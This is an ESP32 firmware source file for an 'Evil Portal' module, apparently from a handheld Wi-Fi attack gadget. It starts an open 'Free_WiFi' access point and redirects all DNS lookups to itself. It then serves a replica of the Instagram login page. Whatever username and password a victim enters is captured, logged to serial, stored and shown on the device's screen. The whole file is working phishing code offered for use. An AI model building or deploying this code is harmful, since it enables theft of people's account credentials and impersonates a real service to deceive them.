#include "evil_portal.h"
#include "utils.h"
#include "icons.h"
#include "menu.h"
#include "config.h"
#include "pins.h"
#include "credentials.h"
#include <U8g2lib.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern DNSServer dnsServer;
extern WebServer webServer;

WebServer evilServer(80);
bool portalRunning = false;
String portalSSID = "Free_WiFi";
String portalPassword = "";
String capturedUsername = "";
String capturedPassword = "";
bool credsCaptured = false;

const char* instagramHTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:100%;max-width:350px;padding:20px}
.box{background:#fff;border:1px solid #dbdbdb;padding:30px 20px;border-radius:1px}
.logo{text-align:center;font-size:42px;font-weight:400;font-family:'Billabong',cursive;margin-bottom:20px}
input{width:100%;padding:9px 8px;margin-bottom:6px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px}
input:focus{outline:none;border-color:#a8a8a8}
.btn{width:100%;padding:7px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer;font-size:14px}
.btn:hover{background:#1877f2}
.error{background:#fef0f0;border:1px solid #ed4956;color:#ed4956;padding:10px;font-size:13px;text-align:center;display:none;margin-bottom:10px}
.divider{display:flex;align-items:center;margin:12px 0}
.divider .line{flex:1;height:1px;background:#dbdbdb}
.divider .or{padding:0 18px;color:#8e8e8e;font-size:13px;font-weight:600}
.fb-login{text-align:center;margin:8px 0;color:#385185;font-size:14px;font-weight:600}
.forgot{text-align:center;margin-top:14px;font-size:12px;color:#00376b}
.signup{text-align:center;padding:20px 0;font-size:14px;color:#262626}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<div class="box">
<div class="logo">Instagram</div>
<div class="error" id="error">Sorry, your password was incorrect.</div>
<form action="/login" method="POST">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="divider"><span class="line"></span><span class="or">OR</span><span class="line"></span></div>
<div class="fb-login">Log in with Facebook</div>
<div class="forgot">Forgot password?</div>
</div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body>
</html>
)rawliteral";

void drawPortalMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawXBMP(56, 2, 16, 16, icon_phishing);
  CenteredStr(18, "Evil Portal");

  if (portalRunning) {
    CenteredStr(30, "✅ Running");
    
    String ssidText = "SSID: " + portalSSID;
    CenteredStr(42, ssidText.c_str());
    
    if (credsCaptured) {
      CenteredStr(54, "Creds: ✅ Captured!");
    } else {
      CenteredStr(54, "Creds: ⏳ Waiting...");
    }
  } else {
    CenteredStr(30, "❌ Stopped");
    CenteredStr(42, "SELECT: Start");
    CenteredStr(54, "BACK: Exit");
  }

  u8g2.sendBuffer();
}

void startPortal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(portalSSID.c_str());

  IPAddress ip(192, 168, 4, 1);
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));

  dnsServer.start(53, "*", ip);

  evilServer.on("/", []() {
    evilServer.send(200, "text/html", instagramHTML);
  });

  evilServer.on("/login", HTTP_POST, []() {
    String username = "", password = "";
    String clientIP = evilServer.client().remoteIP().toString();
    
    if (evilServer.hasArg("username")) {
      username = evilServer.arg("username");
    } else if (evilServer.hasArg("user")) {
      username = evilServer.arg("user");
    } else if (evilServer.hasArg("email")) {
      username = evilServer.arg("email");
    } else if (evilServer.hasArg("login")) {
      username = evilServer.arg("login");
    } else if (evilServer.hasArg("userid")) {
      username = evilServer.arg("userid");
    } else if (evilServer.hasArg("phone")) {
      username = evilServer.arg("phone");
    } else if (evilServer.hasArg("mail")) {
      username = evilServer.arg("mail");
    }
    
    if (evilServer.hasArg("password")) {
      password = evilServer.arg("password");
    } else if (evilServer.hasArg("pass")) {
      password = evilServer.arg("pass");
    } else if (evilServer.hasArg("pwd")) {
      password = evilServer.arg("pwd");
    } else if (evilServer.hasArg("pw")) {
      password = evilServer.arg("pw");
    }
    
    Serial.println("\n📥 EVIL PORTAL LOGIN ATTEMPT");
    Serial.printf("  Username: %s\n", username.c_str());
    Serial.printf("  Password: %s\n", password.c_str());
    Serial.printf("  IP: %s\n", clientIP.c_str());
    
    if (username.length() > 0 && password.length() > 0) {
      addCredential(username, password, clientIP, "EvilPortal");
      
      capturedUsername = username;
      capturedPassword = password;
      credsCaptured = true;
      
      showCredentialPopup(username.c_str(), password.c_str(), clientIP.c_str(), "EvilPortal");
      
      Serial.printf("✅ Credential saved! Total: %d\n", credCount);
    } else {
      Serial.println("❌ Missing fields - username or password empty");
    }
    
    evilServer.send(200, "text/html", "<html><body><script>window.location.href='/'</script></body></html>");
  });

  evilServer.onNotFound([]() {
    evilServer.sendHeader("Location", "/", true);
    evilServer.send(302, "text/plain", "");
  });

  evilServer.begin();
  portalRunning = true;
  credsCaptured = false;
  capturedUsername = "";
  capturedPassword = "";

  String ipStr = ip.toString();
  showPopupMessage("✅ Portal Started!", ("SSID: " + portalSSID).c_str(), ("IP: " + ipStr).c_str());
  delay(2000);
}

void stopPortal() {
    evilServer.stop();
    evilServer.close();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    portalRunning = false;
    showPopupMessage("⏹️ Portal Stopped", "Server offline");
    delay(1000);
}

void evilPortalSetup() {
  portalRunning = false;
  credsCaptured = false;
  capturedUsername = "";
  capturedPassword = "";
  clearPopup();

  showPopupMessage("🎣 Evil Portal", "SELECT: Start", "BACK: Exit");
  delay(1500);
  
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawXBMP(56, 5, 16, 16, icon_phishing);
  CenteredStr(25, "Evil Portal");
  CenteredStr(40, "SELECT: Start");
  CenteredStr(55, "BACK: Exit");
  u8g2.sendBuffer();
}

void evilPortalLoop() {
  if (drawPopupIfActive()) {
    delay(50);
    return;
  }
  
  drawPortalMenu();

  if (isButtonPressed(BTN_SELECT)) {
    if (portalRunning) {
      stopPortal();
      drawPortalMenu();
    } else {
      startPortal();
      drawPortalMenu();
    }
  }

  if (isButtonPressed(BTN_BACK)) {
    if (portalRunning) stopPortal();
    exitModule();
    return;
  }

  if (portalRunning) {
    dnsServer.processNextRequest();
    evilServer.handleClient();

    if (credsCaptured) {
      static unsigned long lastDisplay = 0;
      if (millis() - lastDisplay > 3000) {
        lastDisplay = millis();
        showCredentialPopup(capturedUsername.c_str(), capturedPassword.c_str(), 
                           evilServer.client().remoteIP().toString().c_str(), "EvilPortal");
        delay(2000);
        credsCaptured = false;
        drawPortalMenu();
      }
    }
  }

  delay(20);
}
// Add this function or update the existing one
void evilPortalCleanup() {
    Serial.println("🧹 Evil Portal cleanup...");
    unsigned long startTime = millis();
    
    if (portalRunning) {
        stopPortal();
        delay(100);
    }
    
    dnsServer.stop();
    evilServer.stop();
    portalRunning = false;
    credsCaptured = false;
    capturedUsername = "";
    capturedPassword = "";
    clearPopup();
    
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    Serial.printf("✅ Evil Portal cleanup complete (%lu ms)\n", millis() - startTime);
}